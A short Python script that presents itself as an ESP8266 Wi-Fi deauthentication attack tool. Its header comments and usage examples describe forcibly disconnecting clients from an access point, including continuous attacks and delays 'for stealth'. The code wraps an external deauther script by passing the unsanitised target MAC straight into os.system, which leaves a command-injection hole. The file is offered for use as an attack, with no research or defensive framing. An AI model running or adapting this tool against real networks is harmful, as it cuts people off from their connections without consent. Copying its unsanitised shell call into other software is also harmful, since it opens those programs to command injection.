import argparse
import os
import time

# -------------------------------------------
# ESP8266 - Wi-Fi Deauthentication Attack Tool
# -------------------------------------------
# Features:
# - Performs targeted Wi-Fi deauthentication attacks
# - Disconnects clients from an access point (AP)
# - Can target a single device or entire network
# - Supports continuous attack mode
# - Adjustable delay between deauth packets for stealth
#
# Requirements:
# - ESP8266 / ESP-01S with Deauther firmware
# - Python 3.x
# - PySerial (for communication with ESP8266)
#
# Usage:
# 1. Scan for Wi-Fi networks:
#    python esp8266_deauth.py --scan
# 2. Perform a deauth attack on a specific network:
#    python esp8266_deauth.py --deauth --target AA:BB:CC:DD:EE:FF
# 3. Launch a continuous deauth attack:
#    python esp8266_deauth.py --deauth --target AA:BB:CC:DD:EE:FF --continuous
# 4. Set a delay between deauth packets for stealth:
#    python esp8266_deauth.py --deauth --target AA:BB:CC:DD:EE:FF --delay 5
# -------------------------------------------

def scan_wifi():
    """Scans for available Wi-Fi networks."""
    print("[+] Scanning for Wi-Fi networks...")
    os.system("python deauther.py scan > wifi_scan_results.txt")
    print("[✔] Scan complete. Results saved to wifi_scan_results.txt")

def deauth_attack(target, continuous=False, delay=0):
    """Performs a deauthentication attack on a target AP."""
    print(f"[+] Sending deauth packets to {target}...")
    command = f"python deauther.py deauth {target}"
    if continuous:
        command += " --continuous"
    if delay:
        command += f" --delay {delay}"
    os.system(command)
    print("[✔] Deauth attack executed.")

def main():
    parser = argparse.ArgumentParser(description="ESP8266 - Wi-Fi Deauthentication Attack Tool")
    parser.add_argument("--scan", action='store_true', help="Scan for available Wi-Fi networks")
    parser.add_argument("--deauth", action='store_true', help="Perform a deauth attack on a specific target")
    parser.add_argument("--target", type=str, help="Target MAC address for deauth attack")
    parser.add_argument("--continuous", action='store_true', help="Keep sending deauth packets continuously")
    parser.add_argument("--delay", type=int, help="Delay between deauth packets (seconds)")
    args = parser.parse_args()

    if args.scan:
        scan_wifi()
    elif args.deauth and args.target:
        deauth_attack(args.target, args.continuous, args.delay if args.delay else 0)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
